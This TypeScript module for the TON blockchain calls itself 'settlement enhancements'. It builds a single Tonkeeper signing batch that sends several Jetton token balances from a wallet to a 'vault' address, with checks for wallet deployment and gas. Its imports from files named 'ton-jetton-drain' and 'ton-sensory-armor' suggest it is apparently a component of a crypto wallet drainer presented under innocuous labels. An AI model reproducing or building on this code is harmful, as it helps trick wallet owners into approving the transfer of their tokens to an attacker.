/**
 * TON settlement enhancements — batch Jetton, wallet init, gas estimation.
 */
import { Address, toNano } from '@ton/core'
import { JettonMaster, TonClient } from '@ton/ton'

import { resolveTonCenterJsonRpcUrl, tonCenterApiHeaders } from './ton-sensory-armor.js'
import type { JettonTransferRequest } from './ton-jetton-drain.js'
import { buildJettonTransferBody } from './ton-jetton-drain.js'

export type JettonBatchLeg = {
  jettonMaster: string
  amount: bigint
}

function createTonClient(endpoint: string): TonClient {
  const apiKey = tonCenterApiHeaders()?.['X-API-Key']
  return new TonClient({
    endpoint,
    ...(apiKey ? { apiKey } : {}),
  })
}

export function isTonWalletInitEnabled(): boolean {
  const v = process.env['TON_WALLET_INIT']?.trim().toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

export function isTonGasEstimateEnabled(): boolean {
  const v = process.env['TON_GAS_ESTIMATE']?.trim().toLowerCase()
  if (v === 'false' || v === '0') return false
  return true
}

/**
 * Ensure execution wallet contract is deployed on-chain before settlement.
 */
export async function ensureTonWalletInitialized(params: {
  walletAddress: string
  rpcUrl?: string
}): Promise<{ ok: boolean; initialized: boolean; detail?: string }> {
  if (!isTonWalletInitEnabled()) {
    return { ok: true, initialized: true }
  }

  const endpoint = params.rpcUrl?.trim() || resolveTonCenterJsonRpcUrl()
  try {
    const client = createTonClient(endpoint)
    const addr = Address.parse(params.walletAddress)
    const state = await client.getContractState(addr)
    if (state.state === 'active') {
      return { ok: true, initialized: true }
    }
    return {
      ok: false,
      initialized: false,
      detail: `TON wallet ${params.walletAddress} not initialized (state=${state.state}) — fund deploy first`,
    }
  } catch (e) {
    return { ok: false, initialized: false, detail: e instanceof Error ? e.message : String(e) }
  }
}

/** Estimate TON gas for native + jetton message batch. */
export async function estimateTonGas(params: {
  walletAddress: string
  messageCount: number
  rpcUrl?: string
}): Promise<{ ok: boolean; gasNano?: bigint; detail?: string }> {
  if (!isTonGasEstimateEnabled()) {
    const fallback = toNano('0.05') * BigInt(Math.max(1, params.messageCount))
    return { ok: true, gasNano: fallback }
  }

  const endpoint = params.rpcUrl?.trim() || resolveTonCenterJsonRpcUrl()
  try {
    const client = createTonClient(endpoint)
    const addr = Address.parse(params.walletAddress)
    const balance = await client.getBalance(addr)
    const perMessage = toNano('0.05')
    const forward = toNano('0.01') * BigInt(params.messageCount)
    const gasNano = perMessage * BigInt(params.messageCount) + forward

    if (balance < gasNano) {
      return {
        ok: false,
        gasNano,
        detail: `TON balance ${balance} nano < estimated gas ${gasNano}`,
      }
    }
    return { ok: true, gasNano }
  } catch (e) {
    const fallback = toNano('0.05') * BigInt(Math.max(1, params.messageCount))
    return {
      ok: true,
      gasNano: fallback,
      detail: `estimate fallback: ${e instanceof Error ? e.message : String(e)}`,
    }
  }
}

/**
 * Build batch Jetton transfer request (multiple jetton masters in one Tonkeeper signing batch).
 */
export async function batchJettons(params: {
  wallet: string
  vault: string
  transfers: JettonBatchLeg[]
  rpcUrl?: string
}): Promise<JettonTransferRequest> {
  const legs = params.transfers.filter((t) => t.amount > 0n)
  if (legs.length === 0) {
    throw new Error('batchJettons requires at least one positive transfer')
  }

  const endpoint = params.rpcUrl?.trim() || resolveTonCenterJsonRpcUrl()
  const client = createTonClient(endpoint)
  const owner = Address.parse(params.wallet)
  const destinationOwner = Address.parse(params.vault)

  const initCheck = await ensureTonWalletInitialized({ walletAddress: params.wallet, rpcUrl: endpoint })
  if (!initCheck.ok) {
    throw new Error(initCheck.detail ?? 'TON wallet initialization check failed')
  }

  const messages: JettonTransferRequest['messages'] = []

  for (const leg of legs) {
    const master = client.open(JettonMaster.create(Address.parse(leg.jettonMaster)))
    const jettonWalletContract = await master.getWalletAddress(owner)
    const jettonWallet = jettonWalletContract.toString({ bounceable: true, urlSafe: true })

    const payload = buildJettonTransferBody({
      amount: leg.amount,
      destination: destinationOwner,
      responseDestination: owner,
      forwardTonAmount: toNano('0.01'),
    })

    messages.push({
      address: jettonWallet,
      amount: toNano('0.05').toString(),
      payload,
    })
  }

  const gasEstimate = await estimateTonGas({
    walletAddress: params.wallet,
    messageCount: messages.length,
    rpcUrl: endpoint,
  })
  if (!gasEstimate.ok) {
    throw new Error(gasEstimate.detail ?? 'TON gas estimation failed')
  }

  const validUntil = Math.floor(Date.now() / 1000) + 600

  return {
    from: params.wallet,
    to: params.vault,
    jettonMaster: legs.length === 1 ? legs[0]!.jettonMaster : 'batch',
    jettonWallet: messages[0]?.address ?? '',
    amount: legs.map((l) => l.amount.toString()).join(','),
    validUntil,
    messages,
    wallet: 'tonkeeper',
  }
}
